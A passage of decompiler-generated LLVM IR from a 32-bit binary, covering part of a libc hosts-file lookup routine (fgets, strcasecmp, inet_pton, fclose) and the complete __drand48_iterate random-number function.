dec_label_pc_1002812c:                            ; preds = %dec_label_pc_1002812c.lr.ph, %dec_label_pc_10028118
  %v0_10028118 = phi i32 [ %v0_1002811c9, %dec_label_pc_1002812c.lr.ph ], [ %v1_10028118, %dec_label_pc_10028118 ]
  %v0_10028134 = phi i32 [ %v1_1002812415, %dec_label_pc_1002812c.lr.ph ], [ %v1_10028124, %dec_label_pc_10028118 ]
  store i32 %v3_10028130.pre, i32* %r9.global-to-local, align 4
  %v2_10028134 = add i32 %v0_10028134, %v3_10028130.pre
  %v3_10028134 = inttoptr i32 %v2_10028134 to i16*
  %v4_10028134 = load i16, i16* %v3_10028134, align 2
  %v5_10028134 = zext i16 %v4_10028134 to i32
  store i32 %v5_10028134, i32* %r0.global-to-local, align 4
  %v1_10028138 = and i32 %v5_10028134, 32
  store i32 %v1_10028138, i32* %r9.global-to-local, align 4
  %v3_10028138 = icmp eq i32 %v1_10028138, 0
  br i1 %v3_10028138, label %dec_label_pc_10028118, label %dec_label_pc_10028140.loopexit

dec_label_pc_10028140.loopexit:                   ; preds = %dec_label_pc_1002812c, %dec_label_pc_10028118, %dec_label_pc_1002811c.preheader
  %v0_10028140 = phi i32 [ %v0_1002811c9, %dec_label_pc_1002811c.preheader ], [ %v0_10028118, %dec_label_pc_1002812c ], [ %v1_10028118, %dec_label_pc_10028118 ]
  %v1_10028140 = inttoptr i32 %v0_10028140 to i8*
  %v2_10028140 = load i8, i8* %v1_10028140, align 1
  %v3_10028140 = zext i8 %v2_10028140 to i32
  store i32 %v3_10028140, i32* %r0.global-to-local, align 4
  %v3_10028144 = icmp eq i8 %v2_10028140, 0
  br i1 %v3_10028144, label %dec_label_pc_1002814c, label %dec_label_pc_100280dc.preheader

dec_label_pc_100280dc.preheader:                  ; preds = %dec_label_pc_100280c4, %dec_label_pc_10028140.loopexit
  %v0_100280dc2 = phi i32 [ %v0_10028140, %dec_label_pc_10028140.loopexit ], [ %v0_100280c4, %dec_label_pc_100280c4 ]
  %v1_100280dc3 = inttoptr i32 %v0_100280dc2 to i8*
  %v2_100280dc4 = load i8, i8* %v1_100280dc3, align 1
  %v3_100280dc5 = zext i8 %v2_100280dc4 to i32
  store i32 %v3_100280dc5, i32* %r0.global-to-local, align 4
  %v3_100280e07 = icmp eq i8 %v2_100280dc4, 0
  %v1_100280e48 = mul nuw nsw i32 %v3_100280dc5, 2
  store i32 %v1_100280e48, i32* @r10, align 4
  br i1 %v3_100280e07, label %dec_label_pc_1002814c, label %dec_label_pc_100280ec

dec_label_pc_1002814c:                            ; preds = %dec_label_pc_10028140.loopexit, %dec_label_pc_100280dc.preheader, %dec_label_pc_100280d0, %dec_label_pc_100280c4
  %v0_1002814c = load i32, i32* @r29, align 4
  %v1_10028150 = mul i32 %v0_1002814c, 4
  store i32 %v1_10028150, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10028158 = load i32, i32* @r30, align 4
  %v3_10028158 = add i32 %v2_10028158, %v1_10028150
  %v4_10028158 = inttoptr i32 %v3_10028158 to i32*
  store i32 0, i32* %v4_10028158, align 4
  %tmp55 = icmp slt i32 %v0_1002814c, 2
  br i1 %tmp55, label %dec_label_pc_10028200, label %dec_label_pc_10028160

dec_label_pc_10028160:                            ; preds = %dec_label_pc_1002814c
  %v0_10028160 = load i32, i32* @r18, align 4
  %v3_10028160 = icmp eq i32 %v0_10028160, 1
  br i1 %v3_10028160, label %dec_label_pc_10028218, label %dec_label_pc_10028168

dec_label_pc_10028168:                            ; preds = %dec_label_pc_10028160
  %v3_10028168 = icmp eq i32 %v0_10028160, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_10028168, label %dec_label_pc_10028174, label %dec_label_pc_100281a0.preheader

dec_label_pc_100281a0.preheader:                  ; preds = %dec_label_pc_10028168
  %v1_100281a023 = load i32, i32* @r29, align 4
  %v2_100281a024 = icmp sgt i32 %v1_100281a023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_100281a829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100281a829, i32* @r3, align 4
  br i1 %v2_100281a024, label %dec_label_pc_1002818c, label %dec_label_pc_100281b0

dec_label_pc_10028174:                            ; preds = %dec_label_pc_10028168
  %v0_10028174 = load i32, i32* @r30, align 4
  %v1_10028174 = inttoptr i32 %v0_10028174 to i32*
  %v2_10028174 = load i32, i32* %v1_10028174, align 4
  store i32 %v2_10028174, i32* @r4, align 4
  %v0_10028178 = load i32, i32* %r15.global-to-local, align 4
  %v2_1002817c = inttoptr i32 %v0_10028178 to i8*
  %v3_1002817c = call i32 @__GI_strcoll(i8* %v2_1002817c, i32 %v2_10028174)
  %v3_10028180 = icmp eq i32 %v3_1002817c, 0
  br i1 %v3_10028180, label %dec_label_pc_100281b8, label %dec_label_pc_10028200

dec_label_pc_1002818c:                            ; preds = %dec_label_pc_100281a0.preheader, %dec_label_pc_1002819c
  %v1_1002818c = phi i32 [ %v1_100281a4, %dec_label_pc_1002819c ], [ 4, %dec_label_pc_100281a0.preheader ]
  %v0_100281a831 = phi i32 [ %v0_100281a8, %dec_label_pc_1002819c ], [ %v0_100281a829, %dec_label_pc_100281a0.preheader ]
  %v0_1002818c = load i32, i32* @r30, align 4
  %v2_1002818c = add i32 %v0_1002818c, %v1_1002818c
  %v3_1002818c = inttoptr i32 %v2_1002818c to i32*
  %v4_1002818c = load i32, i32* %v3_1002818c, align 4
  store i32 %v4_1002818c, i32* @r4, align 4
  %v2_10028190 = call i32 @__GI_strcasecmp(i32 %v0_100281a831, i32 %v4_1002818c)
  %v3_10028194 = icmp eq i32 %v2_10028190, 0
  %v0_100281b0.pre = load i32, i32* @r31, align 4
  br i1 %v3_10028194, label %dec_label_pc_1002818c.dec_label_pc_100281b0_crit_edge, label %dec_label_pc_1002819c

dec_label_pc_1002819c:                            ; preds = %dec_label_pc_1002818c
  %v1_1002819c = add i32 %v0_100281b0.pre, 1
  store i32 %v1_1002819c, i32* @r31, align 4
  %v1_100281a0 = load i32, i32* @r29, align 4
  %v2_100281a0 = icmp slt i32 %v1_1002819c, %v1_100281a0
  %v1_100281a4 = mul i32 %v1_1002819c, 4
  store i32 %v1_100281a4, i32* %r0.global-to-local, align 4
  %v0_100281a8 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_100281a8, i32* @r3, align 4
  br i1 %v2_100281a0, label %dec_label_pc_1002818c, label %dec_label_pc_100281b0

dec_label_pc_1002818c.dec_label_pc_100281b0_crit_edge: ; preds = %dec_label_pc_1002818c
  %v1_100281b0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100281b0

dec_label_pc_100281b0:                            ; preds = %dec_label_pc_1002819c, %dec_label_pc_1002818c.dec_label_pc_100281b0_crit_edge, %dec_label_pc_100281a0.preheader
  %v1_100281b0 = phi i32 [ %v1_100281b0.pre, %dec_label_pc_1002818c.dec_label_pc_100281b0_crit_edge ], [ %v1_100281a023, %dec_label_pc_100281a0.preheader ], [ %v1_100281a0, %dec_label_pc_1002819c ]
  %v0_100281b0 = phi i32 [ %v0_100281b0.pre, %dec_label_pc_1002818c.dec_label_pc_100281b0_crit_edge ], [ 1, %dec_label_pc_100281a0.preheader ], [ %v1_1002819c, %dec_label_pc_1002819c ]
  %v2_100281b0 = icmp slt i32 %v0_100281b0, %v1_100281b0
  br i1 %v2_100281b0, label %dec_label_pc_100281b8, label %dec_label_pc_10028200

dec_label_pc_100281b8:                            ; preds = %dec_label_pc_10028174, %dec_label_pc_100281b0
  %v0_100281b8 = load i32, i32* @r19, align 4
  %v3_100281b8 = icmp eq i32 %v0_100281b8, 2
  br i1 %v3_100281b8, label %dec_label_pc_100281c0, label %dec_label_pc_100281dc

dec_label_pc_100281c0:                            ; preds = %dec_label_pc_100281b8
  %v0_100281c0 = load i32, i32* @r30, align 4
  %v1_100281c0 = inttoptr i32 %v0_100281c0 to i32*
  %v2_100281c0 = load i32, i32* %v1_100281c0, align 4
  store i32 %v2_100281c0, i32* @r4, align 4
  %v0_100281c8 = load i32, i32* @r25, align 4
  store i32 %v0_100281c8, i32* @r5, align 4
  store i32 268599760, i32* @lr, align 4
  %v3_100281cc = call i32 @inet_pton(i32 2)
  %v2_100281d0 = icmp sgt i32 %v3_100281cc, 0
  br i1 %v2_100281d0, label %dec_label_pc_10028020, label %dec_label_pc_100281fc

dec_label_pc_100281dc:                            ; preds = %dec_label_pc_100281b8
  %v3_100281dc = icmp eq i32 %v0_100281b8, 10
  br i1 %v3_100281dc, label %dec_label_pc_100281e4, label %dec_label_pc_100281fc

dec_label_pc_100281e4:                            ; preds = %dec_label_pc_100281dc
  %v0_100281e4 = load i32, i32* @r30, align 4
  %v1_100281e4 = inttoptr i32 %v0_100281e4 to i32*
  %v2_100281e4 = load i32, i32* %v1_100281e4, align 4
  store i32 %v2_100281e4, i32* @r4, align 4
  %v0_100281ec = load i32, i32* @r21, align 4
  store i32 %v0_100281ec, i32* @r5, align 4
  store i32 268599796, i32* @lr, align 4
  %v3_100281f0 = call i32 @inet_pton(i32 10)
  %v2_100281f4 = icmp sgt i32 %v3_100281f0, 0
  br i1 %v2_100281f4, label %dec_label_pc_10028050, label %dec_label_pc_100281fc

dec_label_pc_100281fc:                            ; preds = %dec_label_pc_100281c0, %dec_label_pc_100281dc, %dec_label_pc_100281e4
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10028200

dec_label_pc_10028200:                            ; preds = %dec_label_pc_100281b0, %dec_label_pc_10028174, %dec_label_pc_1002814c, %dec_label_pc_100281fc, %dec_label_pc_10028098
  %v0_10028200 = load i32, i32* @r24, align 4
  %v0_10028204 = load i32, i32* @r27, align 4
  %v0_10028208 = load i32, i32* @r20, align 4
  store i32 268599824, i32* @lr, align 4
  %v3_1002820c = call i32 @fgets(i32 %v0_10028200, i32 %v0_10028204, i32 %v0_10028208)
  %v3_10028210 = icmp eq i32 %v3_1002820c, 0
  br i1 %v3_10028210, label %dec_label_pc_10028218, label %dec_label_pc_100280a8

dec_label_pc_10028218:                            ; preds = %dec_label_pc_10028200, %dec_label_pc_10028160, %dec_label_pc_1002807c
  %v0_10028218 = load i32, i32* @r18, align 4
  %v3_10028218 = icmp eq i32 %v0_10028218, 1
  br i1 %v3_10028218, label %dec_label_pc_10028230, label %dec_label_pc_10028220

dec_label_pc_10028220:                            ; preds = %dec_label_pc_10028218
  %v0_10028220 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_10028228.1427 to i32), i32* @lr, align 4
  %v1_10028224 = inttoptr i32 %v0_10028220 to i16*
  %v2_10028224 = call i32 @__GI_fclose(i16* %v1_10028224)
  br label %dec_label_pc_10028230

dec_label_pc_1002822c:                            ; preds = %dec_label_pc_10027fe4, %dec_label_pc_10027fb4, %dec_label_pc_10027fac, %dec_label_pc_10027fa0, %dec_label_pc_10027f90, %dec_label_pc_10027f78, %dec_label_pc_10027f68
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_10028230

dec_label_pc_10028230:                            ; preds = %dec_label_pc_10028218, %dec_label_pc_10028220, %dec_label_pc_10028010, %dec_label_pc_1002822c
  store i32 %v0_10027f30, i32* %r0.global-to-local, align 4
  %v0_10028234 = load i32, i32* @r26, align 4
  ret i32 %v0_10028234

; uselistorder directives
  uselistorder i32 %v0_100281a8, { 1, 0 }
  uselistorder i32 %v1_1002819c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10028150, { 1, 0 }
  uselistorder i32 %v0_1002814c, { 1, 0 }
  uselistorder i32 %v0_100280dc2, { 1, 0 }
  uselistorder i32 %v1_10028124, { 1, 0 }
  uselistorder i32 %v1_1002812415, { 1, 0 }
  uselistorder i32 %v1_10028108, { 1, 0 }
  uselistorder i32 %v0_10028100, { 1, 0, 2 }
  uselistorder i32 %v1_100280e4, { 1, 0 }
  uselistorder i32 %v2_100280b0, { 1, 0 }
  uselistorder i32 %v0_10027fa0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10027f78.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10027f3c, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 15, 3, 16, 0, 23, 17, 18, 1, 19, 20, 22, 21, 2, 24, 25, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 26, 27, 28, 29, 30 }
  uselistorder i32 34, { 19, 20, 4, 5, 13, 14, 17, 6, 7, 18, 0, 15, 16, 21, 22, 10, 11, 12, 23, 8, 1, 2, 3, 9 }
  uselistorder i32 (i16*)* @__GI_fclose, { 6, 7, 0, 2, 3, 1, 4, 5, 8 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 2, 1, 19, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 10, { 20, 86, 87, 88, 89, 90, 91, 92, 11, 53, 93, 94, 12, 3, 100, 4, 101, 1, 13, 21, 104, 22, 83, 23, 84, 99, 14, 54, 24, 25, 26, 55, 15, 56, 97, 60, 61, 57, 58, 59, 96, 95, 77, 16, 78, 39, 40, 41, 42, 43, 7, 27, 44, 45, 28, 46, 47, 48, 29, 49, 30, 50, 51, 31, 5, 6, 2, 52, 98, 102, 103, 75, 32, 0, 17, 33, 8, 34, 9, 19, 18, 63, 35, 62, 64, 65, 36, 66, 37, 67, 68, 69, 70, 71, 72, 73, 74, 76, 10, 79, 80, 81, 82, 85, 38 }
  uselistorder i32 (i32)* @inet_pton, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 (i32, i32)* @__GI_strcasecmp, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 31, 32, 33, 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 6, { 47, 48, 49, 50, 51, 11, 12, 56, 1, 26, 0, 2, 3, 27, 13, 4, 52, 53, 6, 7, 28, 29, 30, 31, 25, 5, 54, 14, 55, 8, 15, 16, 17, 18, 9, 19, 10, 20, 32, 33, 34, 21, 35, 36, 22, 37, 38, 39, 40, 41, 42, 23, 43, 24, 44, 45, 46 }
  uselistorder i32* @global_var_1004513c, { 0, 3, 1, 4, 5, 6, 2 }
  uselistorder i32 35, { 1, 3, 2, 4, 0 }
  uselistorder i32 ()* @__errno_location, { 56, 44, 42, 55, 39, 38, 30, 52, 136, 135, 134, 133, 132, 131, 130, 142, 141, 140, 139, 27, 129, 37, 36, 24, 23, 22, 64, 81, 128, 29, 32, 31, 8, 77, 63, 62, 61, 60, 127, 126, 125, 25, 26, 58, 114, 13, 72, 124, 50, 123, 122, 121, 51, 66, 138, 3, 2, 35, 34, 33, 0, 49, 48, 80, 79, 78, 17, 59, 46, 12, 11, 10, 87, 71, 47, 21, 94, 91, 90, 95, 93, 54, 53, 70, 120, 7, 20, 99, 119, 118, 82, 100, 40, 9, 28, 69, 76, 43, 4, 117, 45, 41, 16, 6, 5, 1, 116, 115, 113, 19, 18, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 144, 98, 137, 97, 96, 15, 14, 92, 89, 68, 67, 88, 86, 85, 84, 83, 143, 57, 75, 74, 73, 65 }
  uselistorder i32* @r21, { 15, 16, 14, 17, 18, 19, 20, 21, 22, 23, 24, 5, 6, 7, 8, 9, 10, 11, 12, 25, 26, 27, 28, 0, 1, 2, 3, 4, 13 }
  uselistorder i32* @r23, { 12, 9, 10, 11, 13, 16, 21, 22, 23, 1, 14, 15, 29, 30, 2, 3, 4, 5, 6, 7, 24, 25, 26, 27, 28, 17, 18, 20, 19, 0, 8 }
  uselistorder i32* @r22, { 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 24, 25, 26, 29, 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 28, 22, 23, 11 }
  uselistorder i32* @r25, { 43, 44, 42, 45, 22, 23, 49, 50, 51, 52, 55, 56, 57, 46, 47, 48, 18, 19, 20, 21, 69, 72, 40, 41, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 58, 59, 60, 61, 62, 63, 64, 35, 36, 53, 54, 15, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 16, 17, 1, 65, 66, 67, 68, 70, 71, 37, 2, 38, 39 }
  uselistorder i32 80, { 5, 17, 4, 3, 2, 1, 15, 12, 11, 6, 13, 7, 14, 8, 0, 9, 10, 16 }
  uselistorder i32 56, { 11, 17, 18, 6, 3, 4, 5, 24, 13, 14, 12, 10, 19, 20, 1, 15, 16, 9, 0, 7, 8, 21, 22, 23, 2 }
  uselistorder i32 44, { 16, 17, 18, 21, 22, 23, 24, 10, 3, 4, 5, 6, 7, 8, 9, 25, 11, 19, 0, 20, 14, 12, 13, 26, 27, 1, 2, 15 }
  uselistorder i32* @r26, { 63, 64, 65, 68, 66, 67, 69, 70, 71, 72, 73, 29, 30, 31, 32, 39, 40, 78, 1, 79, 80, 81, 82, 83, 84, 85, 90, 91, 2, 74, 75, 76, 77, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 33, 34, 35, 36, 37, 38, 111, 112, 4, 5, 6, 7, 8, 9, 10, 113, 114, 115, 116, 140, 60, 61, 62, 136, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 55, 56, 86, 87, 88, 89, 11, 3, 12, 13, 14, 15, 137, 117, 118, 119, 120, 121, 122, 124, 123, 125, 126, 127, 128, 129, 130, 131, 132, 0, 138, 139, 104, 109, 110, 105, 106, 57, 133, 134, 135, 107, 108, 58, 59 }
  uselistorder i32 48, { 18, 19, 9, 10, 21, 22, 1, 23, 24, 25, 5, 26, 27, 2, 0, 11, 12, 13, 3, 14, 15, 28, 29, 20, 16, 8, 30, 31, 17, 6, 7, 4 }
  uselistorder i32 36, { 16, 17, 18, 19, 20, 21, 22, 23, 12, 13, 10, 25, 8, 9, 24, 26, 27, 14, 11, 15, 1, 2, 5, 6, 7, 0, 3, 4 }
  uselistorder i32 -44, { 1, 0, 2 }
  uselistorder i32 -48, { 3, 6, 4, 5, 1, 2, 7, 0 }
  uselistorder i32* @r27, { 100, 101, 102, 103, 104, 105, 4, 106, 107, 108, 109, 47, 48, 49, 50, 167, 192, 193, 194, 195, 196, 197, 59, 60, 118, 2, 119, 120, 121, 122, 123, 124, 125, 126, 127, 132, 110, 0, 111, 112, 113, 114, 115, 116, 117, 5, 34, 35, 36, 3, 37, 38, 39, 40, 41, 42, 43, 44, 45, 1, 46, 156, 157, 158, 51, 52, 53, 54, 55, 56, 57, 58, 159, 160, 161, 162, 163, 164, 165, 166, 168, 169, 198, 6, 199, 205, 210, 98, 99, 150, 200, 204, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 133, 134, 135, 136, 137, 138, 72, 73, 13, 74, 8, 7, 128, 129, 130, 131, 94, 95, 96, 97, 16, 17, 18, 9, 19, 10, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 206, 207, 208, 170, 171, 139, 140, 141, 172, 173, 11, 174, 175, 176, 177, 178, 14, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 15, 32, 33, 190, 191, 209, 142, 143, 144, 145, 154, 155, 80, 81, 146, 147, 148, 149, 79, 12, 201, 202, 203, 75, 76, 77, 78, 87, 89, 88, 151, 152, 153, 82, 83, 84, 85, 86, 90, 91, 92, 93 }
  uselistorder i32 -32, { 2, 3, 0, 1 }
  uselistorder i32* @r24, { 22, 20, 21, 23, 24, 25, 2, 28, 29, 30, 1, 26, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 36, 37, 38, 39, 40, 41, 42, 0, 31, 32, 33, 34, 35, 3, 4, 5, 6, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 19 }
  uselistorder i32 32, { 110, 111, 112, 57, 113, 114, 124, 122, 86, 47, 48, 115, 2, 3, 87, 88, 89, 92, 4, 90, 5, 91, 93, 94, 75, 76, 77, 78, 6, 79, 80, 123, 125, 43, 56, 126, 127, 44, 45, 108, 109, 139, 7, 8, 9, 46, 58, 40, 116, 95, 106, 107, 82, 37, 81, 36, 117, 118, 119, 128, 129, 59, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 120, 102, 41, 60, 42, 38, 52, 10, 96, 97, 83, 84, 72, 73, 121, 98, 99, 100, 101, 85, 105, 140, 141, 103, 12, 13, 11, 15, 14, 61, 39, 16, 74, 17, 18, 104, 19, 20, 62, 22, 21, 24, 49, 23, 63, 26, 25, 64, 28, 27, 66, 30, 29, 65, 68, 32, 31, 67, 53, 1, 50, 54, 55, 69, 51, 70, 34, 35, 33, 71 }
  uselistorder i32* @r16, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32* @r17, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* @r18, { 4, 5, 6, 7, 8, 1, 9, 10, 0, 11, 2, 3 }
  uselistorder i32* @r19, { 5, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 16, 17, 2 }
  uselistorder i32* @r20, { 3, 4, 5, 6, 7, 8, 9, 10, 0, 1, 11, 12, 13, 14, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10028230, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10028200, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_100281fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100281b8, { 1, 0 }
  uselistorder label %dec_label_pc_100281b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1002818c, { 1, 0 }
  uselistorder label %dec_label_pc_1002814c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100280dc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1002812c, { 1, 0 }
  uselistorder label %dec_label_pc_100280c4, { 1, 0 }
  uselistorder label %dec_label_pc_10028098, { 1, 0 }
  uselistorder label %dec_label_pc_1002807c, { 1, 0 }
  uselistorder label %dec_label_pc_10027fe4, { 1, 0 }
  uselistorder label %dec_label_pc_10027f78, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10028248 = load i32, i32* @r4, align 4
  %v1_10028248 = add i32 %v0_10028248, 14
  %v2_10028248 = inttoptr i32 %v1_10028248 to i16*
  %v3_10028248 = load i16, i16* %v2_10028248, align 2
  %v4_10028248 = zext i16 %v3_10028248 to i32
  store i32 %v4_10028248, i32* %r0.global-to-local, align 4
  %v3_1002824c = icmp eq i16 %v3_10028248, 0
  br i1 %v3_1002824c, label %dec_label_pc_10028254, label %dec_label_pc_10028278

dec_label_pc_10028254:                            ; preds = %entry
  store i32 5, i32* %r9.global-to-local, align 4
  store i32 -554899859, i32* %r10.global-to-local, align 4
  %v3_10028264 = add i32 %v0_10028248, 12
  %v4_10028264 = inttoptr i32 %v3_10028264 to i16*
  store i16 11, i16* %v4_10028264, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1002826c = load i32, i32* %r9.global-to-local, align 4
  %v1_1002826c = load i32, i32* @r4, align 4
  %v2_1002826c = add i32 %v1_1002826c, 16
  %v3_1002826c = inttoptr i32 %v2_1002826c to i32*
  store i32 %v0_1002826c, i32* %v3_1002826c, align 4
  %v0_10028270 = load i32, i32* %r10.global-to-local, align 4
  %v1_10028270 = load i32, i32* @r4, align 4
  %v2_10028270 = add i32 %v1_10028270, 20
  %v3_10028270 = inttoptr i32 %v2_10028270 to i32*
  store i32 %v0_10028270, i32* %v3_10028270, align 4
  %v0_10028274 = load i32, i32* %r0.global-to-local, align 4
  %v1_10028274 = trunc i32 %v0_10028274 to i16
  %v2_10028274 = load i32, i32* @r4, align 4
  %v3_10028274 = add i32 %v2_10028274, 14
  %v4_10028274 = inttoptr i32 %v3_10028274 to i16*
  store i16 %v1_10028274, i16* %v4_10028274, align 2
  %v0_10028284.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10028278

dec_label_pc_10028278:                            ; preds = %entry, %dec_label_pc_10028254
  %v0_100282b0 = phi i32 [ %v0_10028248, %entry ], [ %v0_10028284.pre, %dec_label_pc_10028254 ]
  %v0_10028278 = load i32, i32* @r3, align 4
  %v1_10028278 = add i32 %v0_10028278, 4
  %v2_10028278 = inttoptr i32 %v1_10028278 to i16*
  %v3_10028278 = load i16, i16* %v2_10028278, align 2
  %v4_10028278 = zext i16 %v3_10028278 to i32
  store i32 %v4_10028278, i32* %r10.global-to-local, align 4
  %v1_1002827c = add i32 %v0_10028278, 2
  %v2_1002827c = inttoptr i32 %v1_1002827c to i16*
  %v3_1002827c = load i16, i16* %v2_1002827c, align 2
  %v4_1002827c = zext i16 %v3_1002827c to i32
  store i32 %v4_1002827c, i32* %r7.global-to-local, align 4
  %v1_10028280 = inttoptr i32 %v0_10028278 to i16*
  %v2_10028280 = load i16, i16* %v1_10028280, align 2
  %v3_10028280 = zext i16 %v2_10028280 to i32
  %v1_10028284 = add i32 %v0_100282b0, 20
  %v2_10028284 = inttoptr i32 %v1_10028284 to i32*
  %v3_10028284 = load i32, i32* %v2_10028284, align 4
  store i32 %v4_10028278, i32* %r9.global-to-local, align 4
  %v1_1002828c = add i32 %v0_100282b0, 16
  %v2_1002828c = inttoptr i32 %v1_1002828c to i32*
  %v3_1002828c = load i32, i32* %v2_1002828c, align 4
  %v1_10028290 = mul nuw i32 %v4_1002827c, 65536
  store i32 %v3_10028280, i32* %r10.global-to-local, align 4
  %v2_100282a4 = or i32 %v3_10028280, %v1_10028290
  store i32 %v4_10028278, i32* %r7.global-to-local, align 4
  %v2_100282ac = mul i32 %v3_1002828c, %v2_100282a4
  %v1_100282b0 = add i32 %v0_100282b0, 12
  %v2_100282b0 = inttoptr i32 %v1_100282b0 to i16*
  %v3_100282b0 = load i16, i16* %v2_100282b0, align 2
  %v4_100282b0 = zext i16 %v3_100282b0 to i32
  %v2_100282b4 = mul i32 %v3_10028284, %v4_10028278
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_100282bc = zext i32 %v2_100282a4 to i64
  %v3_100282bc = zext i32 %v3_10028284 to i64
  %v4_100282bc = mul nuw i64 %v2_100282bc, %v3_100282bc
  %v5_100282bc = udiv i64 %v4_100282bc, 4294967296
  %v6_100282bc = trunc i64 %v5_100282bc to i32
  %v2_100282c0 = mul i32 %v3_10028284, %v2_100282a4
  %v2_100282c4 = add i32 %v2_100282ac, %v2_100282b4
  %v2_100282c8 = add i32 %v2_100282c4, %v6_100282bc
  %v2_100282cc = add i32 %v4_100282b0, %v2_100282c0
  store i32 %v2_100282cc, i32* @r8, align 4
  %v3_100282cc = icmp ult i32 %v2_100282cc, %v2_100282c0
  %v4_100282d0 = zext i1 %v3_100282cc to i32
  %v5_100282d0 = add i32 %v4_100282d0, %v2_100282c8
  store i32 %v5_100282d0, i32* %r7.global-to-local, align 4
  %v1_100282d4 = mul i32 %v5_100282d0, 65536
  store i32 %v1_100282d4, i32* %r0.global-to-local, align 4
  %v1_100282d8 = trunc i32 %v2_100282cc to i16
  store i16 %v1_100282d8, i16* %v1_10028280, align 2
  %v0_100282dc = load i32, i32* @r8, align 4
  %v1_100282dc = udiv i32 %v0_100282dc, 65536
  %v0_100282e0 = load i32, i32* %r7.global-to-local, align 4
  %v0_100282e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_100282e4 = or i32 %v0_100282e4, %v1_100282dc
  store i32 %v2_100282e4, i32* @r10, align 4
  %v1_100282e8 = trunc i32 %v0_100282e0 to i16
  %v2_100282e8 = load i32, i32* @r3, align 4
  %v3_100282e8 = add i32 %v2_100282e8, 4
  %v4_100282e8 = inttoptr i32 %v3_100282e8 to i16*
  store i16 %v1_100282e8, i16* %v4_100282e8, align 2
  %v0_100282ec = load i32, i32* @r10, align 4
  %v1_100282ec = trunc i32 %v0_100282ec to i16
  %v2_100282ec = load i32, i32* @r3, align 4
  %v3_100282ec = add i32 %v2_100282ec, 2
  %v4_100282ec = inttoptr i32 %v3_100282ec to i16*
  store i16 %v1_100282ec, i16* %v4_100282ec, align 2
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100282c0, { 1, 0 }
  uselistorder i32 %v2_100282a4, { 1, 2, 0 }
  uselistorder i32 %v3_10028284, { 1, 2, 0 }
